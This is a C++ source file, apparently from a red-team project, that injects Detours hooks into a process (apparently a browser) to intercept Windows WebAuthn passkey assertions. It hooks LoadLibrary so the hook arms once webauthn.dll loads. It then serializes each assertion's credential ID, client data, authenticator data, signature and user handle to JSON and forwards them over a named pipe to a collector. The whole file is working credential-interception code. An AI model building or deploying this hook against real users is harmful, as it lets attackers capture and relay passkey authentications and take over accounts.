#include "WebAuthnHook.h"

#include "Logging.h"

#include <detours.h>

#include <string_view>
#include <string>

namespace SpecterOps::Passkeys::WebAuthnHook
{
    constexpr const wchar_t* WebAuthnModuleName = L"webauthn.dll";
    constexpr const wchar_t* WebAuthnHookPipeName = LR"(\\.\pipe\WebAuthnHook)";
    constexpr const char* GetAssertionExportName = "WebAuthNAuthenticatorGetAssertion";

    using WebAuthNAuthenticatorGetAssertionFn = HRESULT(WINAPI*)(
        HWND hwnd,
        LPCWSTR rpId,
        WEBAUTHN_CLIENT_DATA* clientData,
        WEBAUTHN_AUTHENTICATOR_GET_ASSERTION_OPTIONS* options,
        WEBAUTHN_ASSERTION** assertion);

    using LoadLibraryWFn = HMODULE(WINAPI*)(LPCWSTR fileName);
    using LoadLibraryExWFn = HMODULE(WINAPI*)(LPCWSTR fileName, HANDLE file, DWORD flags);

    // Original API entrypoints that Detours rewrites in place.
    WebAuthNAuthenticatorGetAssertionFn TrueWebAuthNAuthenticatorGetAssertion = nullptr;
    LoadLibraryWFn TrueLoadLibraryW = ::LoadLibraryW;
    LoadLibraryExWFn TrueLoadLibraryExW = ::LoadLibraryExW;

    // Guards against attaching the assertion detour more than once per process.
    volatile LONG g_assertionHookInstalled = 0;

    // Tracks whether the LoadLibrary bootstrap detours were installed, so detach
    // skips them when the assertion hook was armed directly at DLL attach.
    volatile LONG g_bootstrapHooksInstalled = 0;

    namespace
    {
        constexpr size_t SerializedAssertionJsonOverhead = 160;

        std::string Base64UrlEncode(const BYTE* buffer, DWORD length)
        {
            if (buffer == nullptr || length == 0)
            {
                return {};
            }

            constexpr char Base64Alphabet[] =
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";

            std::string encoded;
            encoded.reserve(((static_cast<size_t>(length) + 2) / 3) * 4);

            for (DWORD index = 0; index < length; index += 3)
            {
                const DWORD remaining = length - index;
                const BYTE byte0 = buffer[index];
                const BYTE byte1 = remaining > 1 ? buffer[index + 1] : 0;
                const BYTE byte2 = remaining > 2 ? buffer[index + 2] : 0;

                encoded.push_back(Base64Alphabet[(byte0 >> 2) & 0x3F]);
                encoded.push_back(Base64Alphabet[((byte0 & 0x03) << 4) | ((byte1 >> 4) & 0x0F)]);

                if (remaining > 1)
                {
                    encoded.push_back(Base64Alphabet[((byte1 & 0x0F) << 2) | ((byte2 >> 6) & 0x03)]);
                }

                if (remaining > 2)
                {
                    encoded.push_back(Base64Alphabet[byte2 & 0x3F]);
                }
            }

            return encoded;
        }

        std::string SerializeAssertionResponse(
            const WEBAUTHN_CLIENT_DATA* clientData,
            const WEBAUTHN_ASSERTION* assertion)
        {
            if (clientData == nullptr
                || assertion == nullptr
                || clientData->pbClientDataJSON == nullptr
                || clientData->cbClientDataJSON == 0
                || assertion->Credential.pbId == nullptr
                || assertion->Credential.cbId == 0
                || assertion->pbAuthenticatorData == nullptr
                || assertion->cbAuthenticatorData == 0
                || assertion->pbSignature == nullptr
                || assertion->cbSignature == 0)
            {
                return {};
            }

            const std::string credentialId = Base64UrlEncode(assertion->Credential.pbId, assertion->Credential.cbId);
            const std::string clientDataJson = Base64UrlEncode(clientData->pbClientDataJSON, clientData->cbClientDataJSON);
            const std::string authenticatorData = Base64UrlEncode(assertion->pbAuthenticatorData, assertion->cbAuthenticatorData);
            const std::string signature = Base64UrlEncode(assertion->pbSignature, assertion->cbSignature);
            const std::string userHandle = Base64UrlEncode(assertion->pbUserId, assertion->cbUserId);

            std::string json;
            json.reserve(
                credentialId.size() * 2
                + clientDataJson.size()
                + authenticatorData.size()
                + signature.size()
                + userHandle.size()
                + SerializedAssertionJsonOverhead);

            json += R"({"id":")";
            json += credentialId;
            json += R"(","rawId":")";
            json += credentialId;
            json += R"(","type":"public-key","response":{"clientDataJSON":")";
            json += clientDataJson;
            json += R"(","authenticatorData":")";
            json += authenticatorData;
            json += R"(","signature":")";
            json += signature;
            json += R"(","userHandle":)";

            if (assertion->cbUserId == 0 || assertion->pbUserId == nullptr)
            {
                json += "null";
            }
            else
            {
                json += '"';
                json += userHandle;
                json += '"';
            }

            json += R"(},"clientExtensionResults":{}})";
            return json;
        }

        bool WritePipeText(HANDLE pipe, std::string_view text)
        {
            DWORD bytesWritten = 0;
            return ::WriteFile(
                       pipe,
                       text.data(),
                       static_cast<DWORD>(text.size()),
                       &bytesWritten,
                       nullptr)
                && bytesWritten == text.size();
        }

        bool TryForwardAssertionToPipe(
            const WEBAUTHN_CLIENT_DATA* clientData,
            const WEBAUTHN_ASSERTION* assertion)
        {
            HANDLE pipe = ::CreateFileW(
                WebAuthnHookPipeName,
                GENERIC_WRITE,
                0,
                nullptr,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                nullptr);

            if (pipe == INVALID_HANDLE_VALUE)
            {
                return false;
            }

            const std::string response = SerializeAssertionResponse(clientData, assertion);
            if (response.empty())
            {
                ::CloseHandle(pipe);
                return false;
            }

            const bool success =
                WritePipeText(pipe, "start\n")
                && WritePipeText(pipe, response)
                && WritePipeText(pipe, "\nend\n")
                && ::FlushFileBuffers(pipe);

            ::CloseHandle(pipe);
            return success;
        }
    }

    HRESULT WINAPI HookWebAuthNAuthenticatorGetAssertion(
        HWND hwnd,
        LPCWSTR rpId,
        WEBAUTHN_CLIENT_DATA* clientData,
        WEBAUTHN_AUTHENTICATOR_GET_ASSERTION_OPTIONS* options,
        WEBAUTHN_ASSERTION** assertion)
    {
        AppendLog(FormatAssertionRequest(hwnd, rpId, clientData, options));
        const HRESULT result = TrueWebAuthNAuthenticatorGetAssertion(hwnd, rpId, clientData, options, assertion);
        if (FAILED(result) || assertion == nullptr || *assertion == nullptr)
        {
            return result;
        }

        TryForwardAssertionToPipe(clientData, *assertion);
        return result;
    }

    HMODULE WINAPI HookLoadLibraryW(LPCWSTR fileName)
    {
        const HMODULE module = TrueLoadLibraryW(fileName);
        AttachAssertionHook();
        return module;
    }

    HMODULE WINAPI HookLoadLibraryExW(LPCWSTR fileName, HANDLE file, DWORD flags)
    {
        const HMODULE module = TrueLoadLibraryExW(fileName, file, flags);
        AttachAssertionHook();
        return module;
    }

    // Browsers often load webauthn.dll lazily, so installation is retried after
    // DLL load events until the target export becomes available.
    bool AttachAssertionHook()
    {
        if (::InterlockedCompareExchange(&g_assertionHookInstalled, 1, 0) != 0)
        {
            return true;
        }

        const HMODULE webAuthnModule = ::GetModuleHandleW(WebAuthnModuleName);
        if (webAuthnModule == nullptr)
        {
            ::InterlockedExchange(&g_assertionHookInstalled, 0);
            return false;
        }

        const auto target = reinterpret_cast<WebAuthNAuthenticatorGetAssertionFn>(
            ::GetProcAddress(webAuthnModule, GetAssertionExportName));
        if (target == nullptr)
        {
            ::InterlockedExchange(&g_assertionHookInstalled, 0);
            return false;
        }

        TrueWebAuthNAuthenticatorGetAssertion = target;

        if (DetourTransactionBegin() != NO_ERROR)
        {
            ::InterlockedExchange(&g_assertionHookInstalled, 0);
            return false;
        }

        DetourUpdateThread(::GetCurrentThread());
        const LONG attachResult = DetourAttach(
            reinterpret_cast<PVOID*>(&TrueWebAuthNAuthenticatorGetAssertion),
            HookWebAuthNAuthenticatorGetAssertion);

        const LONG commitResult = DetourTransactionCommit();
        if (attachResult != NO_ERROR || commitResult != NO_ERROR)
        {
            ::InterlockedExchange(&g_assertionHookInstalled, 0);
            return false;
        }

        AppendLog(
            L"[" + Timestamp() + L"] " + GetCurrentProcessName()
            + L" (pid " + std::to_wstring(::GetCurrentProcessId())
            + L", user " + GetCurrentUserName()
            + L") WebAuthN Detours hook armed.");
        return true;
    }

    // Bootstrap by watching later LoadLibrary calls in case webauthn.dll is not
    // present when the detour DLL first attaches.
    bool AttachBootstrapHooks()
    {
        if (DetourTransactionBegin() != NO_ERROR)
        {
            return false;
        }

        DetourUpdateThread(::GetCurrentThread());
        const LONG loadLibraryResult = DetourAttach(reinterpret_cast<PVOID*>(&TrueLoadLibraryW), HookLoadLibraryW);
        const LONG loadLibraryExResult = DetourAttach(reinterpret_cast<PVOID*>(&TrueLoadLibraryExW), HookLoadLibraryExW);
        const LONG commitResult = DetourTransactionCommit();

        const bool success = loadLibraryResult == NO_ERROR
            && loadLibraryExResult == NO_ERROR
            && commitResult == NO_ERROR;

        if (success)
        {
            ::InterlockedExchange(&g_bootstrapHooksInstalled, 1);
        }

        return success;
    }

    void DetachHooks()
    {
        if (DetourTransactionBegin() != NO_ERROR)
        {
            return;
        }

        DetourUpdateThread(::GetCurrentThread());

        if (::InterlockedCompareExchange(&g_assertionHookInstalled, 0, 1) == 1 && TrueWebAuthNAuthenticatorGetAssertion != nullptr)
        {
            DetourDetach(
                reinterpret_cast<PVOID*>(&TrueWebAuthNAuthenticatorGetAssertion),
                HookWebAuthNAuthenticatorGetAssertion);
        }

        if (::InterlockedCompareExchange(&g_bootstrapHooksInstalled, 0, 1) == 1)
        {
            DetourDetach(reinterpret_cast<PVOID*>(&TrueLoadLibraryW), HookLoadLibraryW);
            DetourDetach(reinterpret_cast<PVOID*>(&TrueLoadLibraryExW), HookLoadLibraryExW);
        }

        DetourTransactionCommit();
    }
}
